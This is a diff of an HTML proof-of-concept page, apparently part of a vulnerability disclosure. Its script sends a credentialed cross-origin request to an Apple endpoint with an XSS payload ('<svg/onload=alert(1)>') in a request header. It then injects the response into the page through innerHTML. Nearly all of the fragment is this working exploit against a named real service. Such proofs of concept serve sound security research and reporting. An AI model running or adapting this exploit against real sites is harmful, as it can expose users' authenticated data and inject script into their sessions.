@@ -12,10 +12,15 @@
 
 <script>
 function cors() {
-  var req = new XMLHttpRequest();
-  req.onload = reqListener;
-  req.open("GET", "https://xp.apple.com/config/1/report/xp_its_music_main", true);
-  req.setRequestHeader('X-User', '<svg/onload=alert(1)>');
-  req.send();
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("pwnz").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://xp.apple.com/config/1/report/xp_its_music_main", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader('X-User', '<svg/onload=alert(1)>');
+  xhttp.send();
 }
 </script>
